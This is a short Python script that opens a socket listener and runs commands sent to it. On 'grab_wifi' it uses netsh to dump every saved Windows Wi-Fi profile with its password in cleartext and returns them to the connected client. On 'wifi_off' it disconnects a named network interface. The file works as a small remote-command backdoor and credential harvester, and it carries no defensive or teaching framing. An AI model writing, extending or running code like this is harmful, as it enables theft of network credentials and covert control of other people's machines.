import socket
import subprocess
import sys

def grab_wifi():
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
        if result.returncode != 0:
            return "Error fetching WiFi profiles."
        
        profiles = result.stdout.split('\n')
        wifi_passwords = []
        
        for line in profiles:
            if "All User Profile" in line:
                profile_name = line.split(":")[1][1:-1]
                wifi_passwords.append(profile_name)
                # Try to get the password for each profile
                profile_result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile_name, 'key=clear'], capture_output=True, text=True)
                if profile_result.returncode == 0:
                    password_line = [line for line in profile_result.stdout.split("\n") if "Key Content" in line]
                    if password_line:
                        wifi_passwords.append(f"Password for {profile_name}: {password_line[0].split(':')[1][1:]}")
                    else:
                        wifi_passwords.append(f"Password for {profile_name}: (No password set)")
        
        if not wifi_passwords:
            return "No WiFi profiles found."
        
        return "\n".join(wifi_passwords)
    except Exception as e:
        return f"Error: {e}"

def wifi_off(interface_name):
    try:
        result = subprocess.run(['netsh', 'wlan', 'disconnect', 'interface={}'.format(interface_name)], capture_output=True, text=True)
        if result.returncode == 0:
            return f"Successfully disconnected from {interface_name}."
        else:
            return f"Error disconnecting {interface_name}: {result.stderr}"
    except Exception as e:
        return f"Error: {e}"

def handle_command(command):
    if command == 'grab_wifi':
        return grab_wifi()
    elif command.startswith('wifi_off'):
        parts = command.split(' ', 1)
        if len(parts) > 1:
            interface_name = parts[1]
            return wifi_off(interface_name)
        else:
            return "Please specify an interface name after 'wifi_off'."
    else:
        return "Invalid command."

def listen_for_commands():
    # Start listening for incoming connections on port 12345
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind(('127.0.0.1', 12345))
        server_socket.listen(1)  # Allow only one client to connect
        
        print("Waiting for connection...")
        client_socket, client_address = server_socket.accept()
        print(f"Connected by {client_address}")
        
        with client_socket:
            while True:
                # Receive the command from the client
                command = client_socket.recv(1024).decode().strip()
                
                if not command:
                    break  # If the command is empty, stop the connection
                
                print(f"Received command: {command}")
                response = handle_command(command)
                
                # Send the response back to the client
                client_socket.send(response.encode())

if __name__ == '__main__':
    listen_for_commands()
